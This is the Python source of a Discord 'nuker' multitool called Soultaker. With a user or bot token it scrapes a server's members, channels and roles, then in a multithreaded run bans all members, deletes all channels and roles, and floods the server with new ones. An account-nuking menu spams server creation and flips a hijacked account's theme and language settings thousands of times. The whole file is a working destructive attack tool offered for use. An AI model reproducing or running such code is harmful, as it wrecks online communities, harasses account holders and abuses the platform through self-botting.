import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
from colorama import Fore, Back, Style

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

os.system(f'cls & mode 85,20 & title [Soultaker Multitool] - Configuration')

with open('config.json') as f:
    config = json.load(f)

token = config.get('Token')

rich_presence = input(f"{Fore.RED}>{Fore.WHITE} Rich Presence {Fore.WHITE}({Fore.RED}Y{Fore.WHITE}/{Fore.RED}N{Fore.WHITE}){Fore.RED}: ")

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("896039036911775744") 
            RPC.connect() 
            RPC.update(
            large_image="large",
            

            buttons = [
                    {"label": "Discord", "url": "https://discord.gg/2zFdwKzSdb"}
            ],
            start=time.time()
)

        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Soul:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def serverspam(self):
        os.system('cls')
        global servername
        servername = input(f"""{Fore.RED}>{Fore.WHITE} Enter the servernames{Fore.RED}: """)
        print("")
        global headers
        guild = {
        'name': f"{servername}"
        } 
        for i in range(100):
         requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
         print(f"""{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Created Server {Fore.RED}""")

    def sezuire(self):
        os.system('cls')
        global headers
        payload = {
          'theme': "dark"
          }
        payload2 = {
          'theme': "light"
          }
        for i in range(1000):
          requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
          requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
          print(f"""{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Changed Theme {Fore.RED}""")

    def langrape(self):
        os.system('cls')
        global headers
        payload1 = {
              'locale': "ro"
          }
        payload2 = {
          'locale': "ja"
      }
        payload3 = {
          'locale': "fr"
      }
        for i in range(1000):
            requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
            requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
            requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
            print(f"""{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Changed Language {Fore.RED}""")
            
 
    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Kicked{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Deleted Channel {Fore.RED}{channel.strip()}")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Deleted Role {Fore.RED}{role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Created Channel {Fore.RED}{name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Created Role {Fore.RED}{name}")
                    break
                else:
                    break

    async def Scrape(self):
        os.system('cls')
        guild = input(f"{Fore.RED}>{Fore.WHITE} Guild ID{Fore.RED}: ")
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"""
{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Scraped{Fore.RED} {membercount} {Fore.WHITE}Members """)
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Scraped{Fore.RED} {channelcount} {Fore.WHITE}Channels ")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Scraped{Fore.RED} {rolecount} {Fore.WHITE}Roles ")
            r.close()

    async def NukeExecute(self):
        os.system('cls')
        guild = input(f"{Fore.RED}>{Fore.WHITE} Guild ID{Fore.RED}: ")
        channel_name = input(f"{Fore.RED}>{Fore.WHITE} Channel Names{Fore.RED}: ")
        channel_amount = input(f"{Fore.RED}>{Fore.WHITE} Channel Amount{Fore.RED}: ")
        role_name = input(f"{Fore.RED}>{Fore.WHITE} Role Names{Fore.RED}: ")
        role_amount = input(f"{Fore.RED}>{Fore.WHITE} Role Amount{Fore.RED}: ")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def ChannelSpamExecute(self):
        os.system('cls')
        guild = input(f"{Fore.RED}>{Fore.WHITE} Guild ID{Fore.RED}: ")
        name = input(f"{Fore.RED}>{Fore.WHITE} Channel Names{Fore.RED}: ")
        amount = input(f"{Fore.RED}>{Fore.WHITE} Channel Amount{Fore.RED}: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        os.system('cls')
        guild = input(f"{Fore.RED}>{Fore.WHITE} Guild ID{Fore.RED}: ")
        name = input(f"{Fore.RED}>{Fore.WHITE} Role Names{Fore.RED}: ")
        amount = input(f"{Fore.RED}>{Fore.WHITE} Role Amount{Fore.RED}: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()
    
    async def MainMenu(self):
        os.system('cls')
        os.system(f'mode 85,20 & title [Soultaker Multitool] - Main Menu ({client.user})')
        print(f'''
╔═╗╔═╗╦ ╦╦ ╔╦╗╔═╗╦╔═╔═╗╦═╗
╚═╗║ ║║ ║║  ║ ╠═╣╠╩╗║╣ ╠╦╝
╚═╝╚═╝╚═╝╩═╝╩ ╩ ╩╩ ╩╚═╝╩╚═
{Fore.RED}╔════════════════════════╗                   
{Fore.RED}║{Fore.WHITE}[{Fore.RED}1{Fore.WHITE}] Server Nuker        {Fore.RED}║═════════════════════════╗      
{Fore.RED}║{Fore.WHITE}[{Fore.RED}2{Fore.WHITE}] Account Nuker       {Fore.RED}║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Coder: soultaker {Fore.RED}    ║     
{Fore.RED}║{Fore.WHITE}[{Fore.RED}3{Fore.WHITE}] Exit                {Fore.RED}║═════════════════════════╝
{Fore.RED}╚════════════════════════╝
''')

        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == '1':
            await self.ServerNukeMenu()
        elif choice == '2':
            await self.AccountNukeMenu()
        elif choice == '3':
            os._exit(0)
        elif choice == '$':
            await self.MainMenuCreds()

    async def AccountNukeCreds(self):
        os.system('cls')
        print(f'''
╔══════════════════════════════════════════════════╗
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord: soultaker#9385  {Fore.RED}                     ║ 
╚══════════════════════════════════════════════════╝ 
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord Server: https://discord.gg/KAHuvVRA6y{Fore.RED} ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Github: soultak3r   {Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Youtube: White Arrow{Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}M{Fore.WHITE}] Back to Account Nuker Menu{Fore.RED}                    ║ 
╚══════════════════════════════════════════════════╝                         
''')
        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == "M":
            await self.AccountNukeMenu()

    async def ServerNukeCreds(self):
        os.system('cls')
        print(f'''
╔══════════════════════════════════════════════════╗
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord: soultaker#9385  {Fore.RED}                     ║ 
╚══════════════════════════════════════════════════╝ 
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord Server: https://discord.gg/KAHuvVRA6y{Fore.RED} ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Github: soultak3r   {Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Youtube: White Arrow{Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}M{Fore.WHITE}] Back to Server Nuker Menu{Fore.RED}                     ║ 
╚══════════════════════════════════════════════════╝                         
''')
        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == "M":
            await self.ServerNukeMenu()

    async def MainMenuCreds(self):
        os.system('cls')
        print(f'''
╔══════════════════════════════════════════════════╗
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord: soultaker#9385  {Fore.RED}                     ║ 
╚══════════════════════════════════════════════════╝ 
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Discord Server: https://discord.gg/KAHuvVRA6y{Fore.RED} ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Github: soultak3r   {Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Youtube: White Arrow{Fore.RED}                          ║ 
╚══════════════════════════════════════════════════╝
╔══════════════════════════════════════════════════╗       
║{Fore.WHITE}[{Fore.RED}M{Fore.WHITE}] Back to Main Menu{Fore.RED}                             ║ 
╚══════════════════════════════════════════════════╝                         
''')
        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == "M":
            await self.MainMenu()

    async def AccountNukeMenu(self):
        os.system(f'cls & mode 85,20 & title [Soultaker Multitool] - Account Nuker ({client.user})')
        print(f'''
╔═╗╔═╗╦ ╦╦ ╔╦╗╔═╗╦╔═╔═╗╦═╗
╚═╗║ ║║ ║║  ║ ╠═╣╠╩╗║╣ ╠╦╝
╚═╝╚═╝╚═╝╩═╝╩ ╩ ╩╩ ╩╚═╝╩╚═
╔═══════════════════════════╗                   
{Fore.RED}║{Fore.WHITE}[{Fore.RED}1{Fore.WHITE}] Serverspam             {Fore.RED}║
{Fore.RED}║{Fore.WHITE}[{Fore.RED}2{Fore.WHITE}] Themefuck              {Fore.RED}║═════════════════════════╗                 
{Fore.RED}║{Fore.WHITE}[{Fore.RED}3{Fore.WHITE}] Langfuck               {Fore.RED}║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Coder: soultaker {Fore.RED}    ║ 
{Fore.RED}║{Fore.WHITE}[{Fore.RED}4{Fore.WHITE}] Switch to Server Nuker {Fore.RED}║═════════════════════════╝
{Fore.RED}║{Fore.WHITE}[{Fore.RED}5{Fore.WHITE}] Exit                   {Fore.RED}║
╚═══════════════════════════╝         
''')
    
        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == '1':
            await self.serverspam()
            time.sleep(2)
            await self.AccountNukeMenu()
        elif choice == '2':
            await self.sezuire()
            time.sleep(2)
            await self.AccountNukeMenu()
        elif choice == '3':
            await self.langrape()
            time.sleep(2)
            await self.AccountNukeMenu()
        elif choice == '4':
            await self.ServerNukeMenu()
        elif choice == '5':
            os._exit(0)
        elif choice == "$":
            await self.AccountNukeCreds()        

    async def ServerNukeMenu(self):
        os.system(f'cls & mode 85,20 & title [Soultaker Multitool] - Server Nuker ({client.user})')
        print(f'''
{Fore.RED}╔═╗╔═╗╦ ╦╦ ╔╦╗╔═╗╦╔═╔═╗╦═╗
{Fore.RED}╚═╗║ ║║ ║║  ║ ╠═╣╠╩╗║╣ ╠╦╝
{Fore.RED}╚═╝╚═╝╚═╝╩═╝╩ ╩ ╩╩ ╩╚═╝╩╚═
{Fore.RED}╔════════════════════════════╗                     
{Fore.RED}║{Fore.WHITE}[{Fore.RED}1{Fore.WHITE}] Create Roles            {Fore.RED}║     
{Fore.RED}║{Fore.WHITE}[{Fore.RED}2{Fore.WHITE}] Create Channels         {Fore.RED}║═════════════════════════╗ 
{Fore.RED}║{Fore.WHITE}[{Fore.RED}3{Fore.WHITE}] Scrape                  {Fore.RED}║{Fore.WHITE}[{Fore.RED}${Fore.WHITE}] Coder: soultaker {Fore.RED}    ║ 
{Fore.RED}║{Fore.WHITE}[{Fore.RED}4{Fore.WHITE}] Switch to Account Nuker {Fore.RED}║═════════════════════════╝ 
{Fore.RED}║{Fore.WHITE}[{Fore.RED}5{Fore.WHITE}] Exit                    {Fore.RED}║ 
╚════════════════════════════╝      
''')

        choice = input(f"{Fore.RED}>{Fore.WHITE} Choice{Fore.RED}: ")
        if choice == '1':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.ServerNukeMenu()
        elif choice == '2':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.ServerNukeMenu()
        elif choice == '3':
            await self.Scrape()
            time.sleep(2)
            await self.ServerNukeMenu()
        elif choice == '4':
            await self.AccountNukeMenu()
        elif choice == '5':
            os._exit(0)
        elif choice == "$":
            await self.ServerNukeCreds()


    @client.event
    async def on_ready():
        await Soul().MainMenu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}] Invalid token{Fore.RED}")
            input()
            os._exit(0)

if __name__ == "__main__":
    Soul().Startup()